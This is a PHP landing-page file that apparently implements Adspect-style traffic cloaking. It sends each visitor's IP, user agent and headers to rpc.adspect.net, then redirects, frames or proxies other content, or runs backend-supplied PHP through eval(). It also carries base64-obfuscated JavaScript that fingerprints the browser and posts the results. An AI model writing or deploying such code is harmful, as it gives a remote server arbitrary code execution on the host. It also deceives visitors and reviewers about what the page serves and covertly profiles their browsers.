<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('78d9b225-e885-4a07-800e-643a559c537d', 'redirect', '_', base64_decode('4nKrVhTPwQqufxHZvUS8QAJBTVZ544nOJYOeVwA+tHc=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDI2MWY9Wyd0b1N0cmluZycsJ2NvbnNvbGUnLCdzdHJpbmdpZnknLCcxOGVpWGhmRCcsJ2Vycm9ycycsJ2RvY3VtZW50RWxlbWVudCcsJ2FwcGVuZENoaWxkJywnMjU2Mjk1MGhrSWJ4VycsJ2Nsb3N1cmUnLCdib2R5JywnZ2V0T3duUHJvcGVydHlOYW1lcycsJ21ldGhvZCcsJ3dlYmdsJywnMjE5MlB6Y0VJTScsJ25vZGVOYW1lJywnNTQ4aXZUd2dQJywnUE9TVCcsJ25hbWUnLCd0eXBlJywnc2NyZWVuJywndG9zdHJpbmcnLCdjYW52YXMnLCc5MDg5ODBock16eXInLCcxNTFuQUF5Y28nLCc3MzQ5b0NNS2liJywnZnVuY3Rpb24nLCd0aW1lem9uZU9mZnNldCcsJ3N1Ym1pdCcsJ3F1ZXJ5JywnaGlkZGVuJywnZGF0YScsJ3Blcm1pc3Npb24nLCdwdXNoJywnb2JqZWN0JywnY3JlYXRlRWxlbWVudCcsJ25hdmlnYXRvcicsJzM5NzMxOVV5ZlVzeicsJ3Blcm1pc3Npb25zJywnbG9jYXRpb24nLCdub3RpZmljYXRpb25zJywnaHJlZicsJ2RvY3VtZW50JywnZ2V0RXh0ZW5zaW9uJywnVG91Y2hFdmVudCcsJ21lc3NhZ2UnLCdVTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCcsJzI5NzE5WFphSE5GJywnMzcyNDc1aE5qS3pIJywnd2luZG93JywnZ2V0UGFyYW1ldGVyJywnTm90aWZpY2F0aW9uJywnYWN0aW9uJywnaW5wdXQnXTt2YXIgXzB4MTcyMT1mdW5jdGlvbihfMHg0ODdiMzgsXzB4MWQwOTg4KXtfMHg0ODdiMzg9XzB4NDg3YjM4LTB4MTdhO3ZhciBfMHgyNjFmMmQ9XzB4MjYxZltfMHg0ODdiMzhdO3JldHVybiBfMHgyNjFmMmQ7fTsoZnVuY3Rpb24oXzB4MWJhZjBkLF8weDQzZWExYSl7dmFyIF8weDUzOWMxND1fMHgxNzIxO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4NDY2NjViPXBhcnNlSW50KF8weDUzOWMxNCgweDE3YykpKy1wYXJzZUludChfMHg1MzljMTQoMHgxOWMpKSpwYXJzZUludChfMHg1MzljMTQoMHgxOWEpKSstcGFyc2VJbnQoXzB4NTM5YzE0KDB4MTg3KSkrcGFyc2VJbnQoXzB4NTM5YzE0KDB4MWEzKSkrcGFyc2VJbnQoXzB4NTM5YzE0KDB4MWE0KSkqLXBhcnNlSW50KF8weDUzOWMxNCgweDFhNSkpKy1wYXJzZUludChfMHg1MzljMTQoMHgxODYpKSpwYXJzZUludChfMHg1MzljMTQoMHgxOTApKStwYXJzZUludChfMHg1MzljMTQoMHgxOTQpKTtpZihfMHg0NjY2NWI9PT1fMHg0M2VhMWEpYnJlYWs7ZWxzZSBfMHgxYmFmMGRbJ3B1c2gnXShfMHgxYmFmMGRbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weGRkNmY2YSl7XzB4MWJhZjBkWydwdXNoJ10oXzB4MWJhZjBkWydzaGlmdCddKCkpO319fShfMHgyNjFmLDB4OWVlYTUpLGZ1bmN0aW9uKCl7dmFyIF8weDIzZGNkZj1fMHgxNzIxO2Z1bmN0aW9uIF8weDVhMTIzZSgpe3ZhciBfMHhmMWE1NWI9XzB4MTcyMTtfMHg0NGQ4OGFbXzB4ZjFhNTViKDB4MTkxKV09XzB4Mjk5YjYwO3ZhciBfMHgyZmQ1MGM9ZG9jdW1lbnRbJ2NyZWF0ZUVsZW1lbnQnXSgnZm9ybScpLF8weDE0ZjA1PWRvY3VtZW50WydjcmVhdGVFbGVtZW50J10oXzB4ZjFhNTViKDB4MThjKSk7XzB4MmZkNTBjW18weGYxYTU1YigweDE5OCldPV8weGYxYTU1YigweDE5ZCksXzB4MmZkNTBjW18weGYxYTU1YigweDE4YildPXdpbmRvd1tfMHhmMWE1NWIoMHgxN2UpXVtfMHhmMWE1NWIoMHgxODApXSxfMHgxNGYwNVtfMHhmMWE1NWIoMHgxOWYpXT1fMHhmMWE1NWIoMHgxYWEpLF8weDE0ZjA1W18weGYxYTU1YigweDE5ZSldPV8weGYxYTU1YigweDFhYiksXzB4MTRmMDVbJ3ZhbHVlJ109SlNPTltfMHhmMWE1NWIoMHgxOGYpXShfMHg0NGQ4OGEpLF8weDJmZDUwY1tfMHhmMWE1NWIoMHgxOTMpXShfMHgxNGYwNSksZG9jdW1lbnRbXzB4ZjFhNTViKDB4MTk2KV1bXzB4ZjFhNTViKDB4MTkzKV0oXzB4MmZkNTBjKSxfMHgyZmQ1MGNbXzB4ZjFhNTViKDB4MWE4KV0oKTt9dmFyIF8weDI5OWI2MD1bXSxfMHg0NGQ4OGE9e307dHJ5e3ZhciBfMHgyZTA0NGU9ZnVuY3Rpb24oXzB4NDNiMjZlKXt2YXIgXzB4NDU0MjY2PV8weDE3MjE7aWYoXzB4NDU0MjY2KDB4MWFlKT09PXR5cGVvZiBfMHg0M2IyNmUmJm51bGwhPT1fMHg0M2IyNmUpe3ZhciBfMHhhOWM3N2E9ZnVuY3Rpb24oXzB4NDRjNjZlKXt2YXIgXzB4MjlkN2M3PV8weDQ1NDI2Njt0cnl7dmFyIF8weDIxZTVmYz1fMHg0M2IyNmVbXzB4NDRjNjZlXTtzd2l0Y2godHlwZW9mIF8weDIxZTVmYyl7Y2FzZSBfMHgyOWQ3YzcoMHgxYWUpOmlmKG51bGw9PT1fMHgyMWU1ZmMpYnJlYWs7Y2FzZSBfMHgyOWQ3YzcoMHgxYTYpOl8weDIxZTVmYz1fMHgyMWU1ZmNbXzB4MjlkN2M3KDB4MThkKV0oKTt9XzB4NTVlZWQyW18weDQ0YzY2ZV09XzB4MjFlNWZjO31jYXRjaChfMHg1MTg0ZTcpe18weDI5OWI2MFsncHVzaCddKF8weDUxODRlN1snbWVzc2FnZSddKTt9fSxfMHg1NWVlZDI9e30sXzB4NTcxNThlO2ZvcihfMHg1NzE1OGUgaW4gXzB4NDNiMjZlKV8weGE5Yzc3YShfMHg1NzE1OGUpO3RyeXt2YXIgXzB4MzA3NGEzPU9iamVjdFtfMHg0NTQyNjYoMHgxOTcpXShfMHg0M2IyNmUpO2ZvcihfMHg1NzE1OGU9MHgwO18weDU3MTU4ZTxfMHgzMDc0YTNbJ2xlbmd0aCddOysrXzB4NTcxNThlKV8weGE5Yzc3YShfMHgzMDc0YTNbXzB4NTcxNThlXSk7XzB4NTVlZWQyWychISddPV8weDMwNzRhMzt9Y2F0Y2goXzB4NDE2ZWMxKXtfMHgyOTliNjBbXzB4NDU0MjY2KDB4MWFkKV0oXzB4NDE2ZWMxWydtZXNzYWdlJ10pO31yZXR1cm4gXzB4NTVlZWQyO319O18weDQ0ZDg4YVtfMHgyM2RjZGYoMHgxYTApXT1fMHgyZTA0NGUod2luZG93WydzY3JlZW4nXSksXzB4NDRkODhhW18weDIzZGNkZigweDE4OCldPV8weDJlMDQ0ZSh3aW5kb3cpLF8weDQ0ZDg4YVsnbmF2aWdhdG9yJ109XzB4MmUwNDRlKHdpbmRvd1tfMHgyM2RjZGYoMHgxN2IpXSksXzB4NDRkODhhW18weDIzZGNkZigweDE3ZSldPV8weDJlMDQ0ZSh3aW5kb3dbJ2xvY2F0aW9uJ10pLF8weDQ0ZDg4YVtfMHgyM2RjZGYoMHgxOGUpXT1fMHgyZTA0NGUod2luZG93Wydjb25zb2xlJ10pLF8weDQ0ZDg4YVsnZG9jdW1lbnRFbGVtZW50J109ZnVuY3Rpb24oXzB4NDYzZjQ4KXt2YXIgXzB4ZjEwZDk1PV8weDIzZGNkZjt0cnl7dmFyIF8weDI1MTQ0Mj17fTtfMHg0NjNmNDg9XzB4NDYzZjQ4WydhdHRyaWJ1dGVzJ107Zm9yKHZhciBfMHgzYThiMjIgaW4gXzB4NDYzZjQ4KV8weDNhOGIyMj1fMHg0NjNmNDhbXzB4M2E4YjIyXSxfMHgyNTE0NDJbXzB4M2E4YjIyW18weGYxMGQ5NSgweDE5YildXT1fMHgzYThiMjJbJ25vZGVWYWx1ZSddO3JldHVybiBfMHgyNTE0NDI7fWNhdGNoKF8weDM0ZDQzNCl7XzB4Mjk5YjYwWydwdXNoJ10oXzB4MzRkNDM0W18weGYxMGQ5NSgweDE4NCldKTt9fShkb2N1bWVudFtfMHgyM2RjZGYoMHgxOTIpXSksXzB4NDRkODhhW18weDIzZGNkZigweDE4MSldPV8weDJlMDQ0ZShkb2N1bWVudCk7dHJ5e18weDQ0ZDg4YVtfMHgyM2RjZGYoMHgxYTcpXT1uZXcgRGF0ZSgpWydnZXRUaW1lem9uZU9mZnNldCddKCk7fWNhdGNoKF8weDJlZTE1Myl7XzB4Mjk5YjYwWydwdXNoJ10oXzB4MmVlMTUzW18weDIzZGNkZigweDE4NCldKTt9dHJ5e18weDQ0ZDg4YVtfMHgyM2RjZGYoMHgxOTUpXT1mdW5jdGlvbigpe31bXzB4MjNkY2RmKDB4MThkKV0oKTt9Y2F0Y2goXzB4MWJlY2ZiKXtfMHgyOTliNjBbXzB4MjNkY2RmKDB4MWFkKV0oXzB4MWJlY2ZiW18weDIzZGNkZigweDE4NCldKTt9dHJ5e18weDQ0ZDg4YVsndG91Y2hFdmVudCddPWRvY3VtZW50WydjcmVhdGVFdmVudCddKF8weDIzZGNkZigweDE4MykpW18weDIzZGNkZigweDE4ZCldKCk7fWNhdGNoKF8weDQxNTZkYSl7XzB4Mjk5YjYwW18weDIzZGNkZigweDFhZCldKF8weDQxNTZkYVtfMHgyM2RjZGYoMHgxODQpXSk7fXRyeXtfMHgyZTA0NGU9ZnVuY3Rpb24oKXt9O3ZhciBfMHg0ODA5YmY9MHgwO18weDJlMDQ0ZVtfMHgyM2RjZGYoMHgxOGQpXT1mdW5jdGlvbigpe3JldHVybisrXzB4NDgwOWJmLCcnO30sY29uc29sZVsnbG9nJ10oXzB4MmUwNDRlKSxfMHg0NGQ4OGFbXzB4MjNkY2RmKDB4MWExKV09XzB4NDgwOWJmO31jYXRjaChfMHg0ZGFhMmUpe18weDI5OWI2MFtfMHgyM2RjZGYoMHgxYWQpXShfMHg0ZGFhMmVbXzB4MjNkY2RmKDB4MTg0KV0pO313aW5kb3dbJ25hdmlnYXRvciddWydwZXJtaXNzaW9ucyddW18weDIzZGNkZigweDFhOSldKHsnbmFtZSc6XzB4MjNkY2RmKDB4MTdmKX0pWyd0aGVuJ10oZnVuY3Rpb24oXzB4MmRmMzA5KXt2YXIgXzB4M2IxZTk0PV8weDIzZGNkZjtfMHg0NGQ4OGFbXzB4M2IxZTk0KDB4MTdkKV09W3dpbmRvd1tfMHgzYjFlOTQoMHgxOGEpXVtfMHgzYjFlOTQoMHgxYWMpXSxfMHgyZGYzMDlbJ3N0YXRlJ11dLF8weDVhMTIzZSgpO30sXzB4NWExMjNlKTt0cnl7dmFyIF8weDQ5ZGY4YT1kb2N1bWVudFtfMHgyM2RjZGYoMHgxN2EpXShfMHgyM2RjZGYoMHgxYTIpKVsnZ2V0Q29udGV4dCddKCd3ZWJnbCcpLF8weDQ1ZDAxNz1fMHg0OWRmOGFbXzB4MjNkY2RmKDB4MTgyKV0oJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nKTtfMHg0NGQ4OGFbXzB4MjNkY2RmKDB4MTk5KV09eyd2ZW5kb3InOl8weDQ5ZGY4YVtfMHgyM2RjZGYoMHgxODkpXShfMHg0NWQwMTdbJ1VOTUFTS0VEX1ZFTkRPUl9XRUJHTCddKSwncmVuZGVyZXInOl8weDQ5ZGY4YVtfMHgyM2RjZGYoMHgxODkpXShfMHg0NWQwMTdbXzB4MjNkY2RmKDB4MTg1KV0pfTt9Y2F0Y2goXzB4NGE1OTVmKXtfMHgyOTliNjBbXzB4MjNkY2RmKDB4MWFkKV0oXzB4NGE1OTVmW18weDIzZGNkZigweDE4NCldKTt9fWNhdGNoKF8weDQyMmVmOSl7XzB4Mjk5YjYwW18weDIzZGNkZigweDFhZCldKF8weDQyMmVmOVsnbWVzc2FnZSddKSxfMHg1YTEyM2UoKTt9fSgpKTs="></script>
</body>
</html>
<?php exit;